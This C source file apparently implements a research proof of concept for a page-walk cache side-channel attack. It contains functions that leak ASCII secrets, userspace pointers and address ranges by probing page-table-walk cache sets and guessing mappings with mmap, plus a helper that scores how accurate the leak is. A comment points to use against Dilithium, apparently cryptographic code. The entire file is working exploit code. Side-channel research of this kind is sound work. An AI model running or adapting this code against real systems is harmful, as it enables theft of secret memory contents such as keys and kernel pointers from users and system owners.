#include "leak.h"


// This retrives the non-cached VPN or PO in the target page walk
uint64_t leak_pwsc_non_cached(uint64_t addr, uint64_t *init_noise_filter) {
    // Set up run_pwsc
    reset_noise_filter(); 
    if(init_noise_filter != NULL)
        for(int i = 0; i < ncache_lines; i++)
            noise_filter[i] = init_noise_filter[i];

    // Call run_pwsc
    return get_non_buffered_value(addr);
}

// Just runs the PWSC channel with whatever configurations have been set 
struct pwsc_ans leak_pwsc_ptr(uint64_t addr, uint64_t *init_noise_filter) {
    // Set up run_pwsc
    reset_noise_filter(); 
    if(init_noise_filter != NULL)
        for(int i = 0; i < ncache_lines; i++)
            noise_filter[i] = init_noise_filter[i];

    // Call run_pwsc
    return run_pwsc(addr); 
}


/*
 *  leak_ascii_char -  Optimized function for ASCII characters: we only need a page walk depth up to VPN4 (depth 1)
 *  Inputs:     Address under target, initial noise filter config, expected VPN4 value
 *  Outputs:    pwsc_ans with a complete VPN4 value and VPN3 cache set value. This allows the caller 
 *              to reconstruct one ASCII character
 *  Assumptions: `expected_vpn4_set` is set to `ncache_lines` if there is not an expected value
 */
struct pwsc_ans leak_ascii_char(uint64_t addr, uint64_t *init_noise_filter, uint64_t expected_vpn4_set) {
    
    // Determine VPN4 cache set (this leaks the initial 6 bits of the ascii character)
    struct pwsc_ans init_pwsc_ans; init_pwsc_ans.va.va = 0; init_pwsc_ans.num_lines_found = 0;
    uint64_t initial_line = leak_pwsc_non_cached(addr, init_noise_filter);
    if(initial_line != ncache_lines) {
        init_pwsc_ans.va.vpn4_set = initial_line;
        init_pwsc_ans.num_lines_found = 1;

        if(expected_vpn4_set != ncache_lines && initial_line != expected_vpn4_set)
            fprintf(stderr, "[WARNING] previous line does not match this line\n");
    }
    else {
        init_pwsc_ans.va.vpn4_set = expected_vpn4_set;
        init_pwsc_ans.num_lines_found = 0;
    }
    
    // Determine the VPN4 CO bits (since it is an ascii character we only need to leak 2 more bits)
    for(uint8_t co_guess = 0; co_guess < 4; co_guess++) {

        // Map our guess
        struct pwsc_ans guess = init_pwsc_ans; 
        guess.va.vpn4_co = co_guess<<1; // The least significant bit of the CO is always 0 (since ASCII secret here)
        char *va_buffer = mmap((void *)guess.va.va, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);
        if(va_buffer == (void *)-1) {
            fprintf(stderr, "[ERROR] mmap in leak_ascii_char failed :(\n");
            return init_pwsc_ans;
        }
        *va_buffer = 0x5A;

        // Check if our guess is correct
        // ****Please note! that if the vpn4 set and vpn3 set are equal this will not be able to 
        // find a value. This allows for faster performance and simplier code but can lead to a
        // small drop in accuracy. In the future it might be worthwhile to upgrade this to avoid 
        // this issue. 
        uint64_t found_line = leak_pwsc_non_cached(addr, init_noise_filter); 
        munmap((void *)guess.va.va, 4096); 
        if((found_line != ncache_lines) && found_line != init_pwsc_ans.va.vpn4_set) {
            guess.va.vpn3_set = found_line; 
            return guess; 
        }

    }

    fprintf(stderr, "[WARNING] Unable to find cache offset :(!\n");
    return init_pwsc_ans; 
}


struct pwsc_ans leak_userspace_ptr(uint64_t addr, uint64_t *init_noise_filter, uint64_t expected_vpn4_set) {
    // Leak whatever is mapped (lose the cache offsets here)
    struct pwsc_ans init_profile = leak_pwsc_ptr(addr, init_noise_filter);
    if(init_profile.va.vpn4_set != expected_vpn4_set) 
        fprintf(stderr, "[WARNING] previous line does not match this line\n");
    // You can add more complex handling, for example sometimes things are reordered.
    // I chose to not add more complex handling here and just decide to give up lol.
    // It doesn't seem to have that big of a hit on performance and helps improve speed.  

    // Don't attempt to use the mapping order oracle on kernel pointers 
    if(init_profile.va.vpn4_set > 31 && init_profile.num_lines_found == 1) 
        return init_profile; 

    // If we found multiple cache sets (lines) then we either don't know the 
    // cache offsets. Then we should return all zeros to not claim to know anything
    if(init_profile.num_lines_found != 1) {
        init_profile.va.va = 0; 
        return init_profile;
    }

    // Memory mapping order oracle 
    struct pwsc_ans ret = init_profile; 
    uint64_t previous_set = ret.va.vpn4_set; 
    for(int cur_depth = ret.num_lines_found; cur_depth <= 4; cur_depth++) {
        for(uint8_t co_guess = 0; co_guess < 8; co_guess++) {

            // Fill in guess
            if(cur_depth == 1) ret.va.vpn4_co = co_guess; 
            else if(cur_depth == 2) ret.va.vpn3_co = co_guess;
            else if(cur_depth == 3) ret.va.vpn2_co = co_guess; 
            else if(cur_depth == 4) ret.va.vpn1_co = co_guess; 

            // Avoid making the memory mapped region result in the nexet vpn set to be 0
            // which we have trouble handling
            if(cur_depth <= 1) { 
                ret.va.vpn3_set = 32; 
                ret.va.vpn3_co = 6;
            }
            if(cur_depth <= 2) {
                ret.va.vpn2_set = 32;
                ret.va.vpn2_co = 6; 
            }
            if(cur_depth <= 3) {
                ret.va.vpn1_set = 32;
                ret.va.vpn1_co = 6;   
            }

            // Map the guess 
            char *va_buffer = mmap((void *)ret.va.va, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);
            if(va_buffer == (void *)-1) {
                fprintf(stderr, "[ERROR] mmap in leak_userspace_ptr failed :(!\n");
                goto return_ans; 
            }
            *va_buffer = 0x5A;

            // Check if guess is right 
            uint64_t found_line = leak_pwsc_non_cached(addr, init_noise_filter); 
            munmap((void *)va_buffer, 4096); 
            if(found_line != ncache_lines && found_line != previous_set) {
                if(cur_depth == 1) ret.va.vpn3_set = found_line; 
                else if(cur_depth == 2) ret.va.vpn2_set = found_line; 
                else if(cur_depth == 3) ret.va.vpn1_set = found_line; 
                else if(cur_depth == 4) ret.va.po_set = found_line; 
                ret.num_lines_found++; 

                // update previous_set
                previous_set = found_line; 
                break; 
            } else if (found_line == ncache_lines) { 
                // It may the base that the next vpn set is blocked by the noise filter somehow 
                // thus no signal tells us that our guess is correct but we can't continue since 
                // we don't exactly know the next vpn set. 
                goto return_ans; 
            }
        }

        // Found nothing
        if(ret.num_lines_found == (uint64_t)cur_depth) {
            fprintf(stderr, "[WARNING] Unable to determine CO and next cache set\n");
            goto return_ans; 
        }
    }

return_ans:
    // TODO move this to the actual place that uses this instead of applying it boardly --> i.e. to the dilithium code. 
    if(ret.num_lines_found < 3) ret.va.va = 0; // zero it out 

    // If we don't find a full VPN (including the cache offset) remove additional information 
    // to avoid reporting incorrect bits. 
    if(ret.num_lines_found < 2) { 
        ret.va.vpn4_co = 0;
        ret.va.vpn3_set = 0; 
        ret.va.vpn3_co = 0;
    }
    else if(ret.num_lines_found < 3) {
        ret.va.vpn3_co = 0;
        ret.va.vpn2_set = 0;
        ret.va.vpn2_co = 0; 
    }
    else if(ret.num_lines_found < 4) {
        ret.va.vpn2_co = 0;
        ret.va.vpn1_set = 0;
        ret.va.vpn1_co = 0;   
    }
    else if(ret.num_lines_found < 5) {
        ret.va.vpn1_co = 0;
        ret.va.po_set = 0;
        ret.va.po_co = 0; 
    }

    return ret; 
}


struct bit_map* leak_addr_range(uint64_t start_leak, uint64_t end_leak, uint64_t gran, uint64_t *init_noise_filter, uint64_t ascii_flag) {
    if(start_leak == 0) {
        fprintf(stderr, "[ERROR] start_leak can't equal zero or else we will integer overflow!\n");
        return NULL; 
    }

    // Create bit map (to store leaked bits)
    struct bit_map *ret = create_bit_map(end_leak - start_leak); 
    if(!ret) {
        fprintf(stderr, "[ERROR] Unable to allocate a bit map for leakage...\n");
        return NULL; 
    }
    
    // Begin leaking the address range
    int byte_idx = 2;
    uint64_t previous_set = 64;
    for(uint64_t cur_addr = end_leak - 1; cur_addr >= start_leak; cur_addr -= gran) {

        // Calculate possible noise from the PO of the secret's address and mask them out 
        // with the noise filter. There is additional filtering to account potential prefetching
        // and just to be extra cautious. 
        int PO = cur_addr % 4096; 
        int PO_set = (PO / 64) % ncache_lines;
        init_noise_filter[PO_set] += 2; 
        init_noise_filter[(PO_set + 1) % ncache_lines] += 2;

        // Retrive secret 
        struct pwsc_ans ans = {
            .va = { .va = 0 },
            .num_lines_found = 0
        };
        if(ascii_flag) ans = leak_ascii_char(cur_addr, init_noise_filter, previous_set);
        else ans = leak_userspace_ptr(cur_addr, init_noise_filter, previous_set);

        // In case of larger granularities need additional shifts in the bitmap 
        if(cur_addr != end_leak - 1) 
            for(uint64_t i = 0; i < gran - 1; i++) 
                shift_one_byte(ret); 

        // Add found bits to the map 
        // This function also does a correctness check with previously found bits
        uint64_t status = add_ptr_to_bit_map(ret, ans.va.va, ans.num_lines_found, (cur_addr != end_leak - 1)); 
        // You can add smarter error handling if we find that the previously found bits don't match the found bits.
        (void) status; 

        // Output leaked character if in ASCII mode
        if(ascii_flag) {
            fprintf(stderr, "Leaked character: <%c> Value: %d\n", (char) ret->bytes[byte_idx], ret->bytes[byte_idx]);
            extract_string(ret);
        }
        byte_idx += gran;

        // Update previous set
        previous_set = VPN4_TO_CACHE_LINE((ans.va.va<<8));  

        // Clear advanced noise filter 
        init_noise_filter[PO_set] -= 2; 
        init_noise_filter[(PO_set + 1) % ncache_lines] -= 2;
    }
    
    return ret; 
}


void extract_string(struct bit_map *map) {
    char string_ans[1024] = {0};
    char *ans = NULL;
    fprintf(stderr, "hexdump: ");

    // We need to flip the endianness of the byte map for strings (big endian to little endian )
    for(int i = 0; i <= map->cur_pos; i++) { 
        string_ans[i] = map->bytes[map->cur_pos - i];
        fprintf(stderr, "%02x(%c) ", map->bytes[map->cur_pos - i], (char)map->bytes[map->cur_pos - i]); 

        // Remove any bad zeros at the front of the bitmap
        if(!ans && string_ans[i] != 0) ans = string_ans + i; 
    }
    fprintf(stderr, "\n");

    // Output extract string 
    fprintf(stderr, "Extracted string <%s>\n", ans); 
}


double accuracy(struct bit_map *guess, char *correct) {
    double correct_bits = 0.0; 
    double total_bits = (guess->cur_pos - 2) * 8.0; 
    for(int64_t i = 2; i < guess->cur_pos; i++) 
        for(uint64_t shift = 0; shift < 8; shift++) 
            if( (guess->bytes[guess->cur_pos - i] & (1<<shift)) == (correct[i ] & (1<<shift)) ) 
                correct_bits += 1.0;

    fprintf(stderr, "Stats: %f/%f\n", correct_bits, total_bits);
    return (correct_bits / total_bits);
}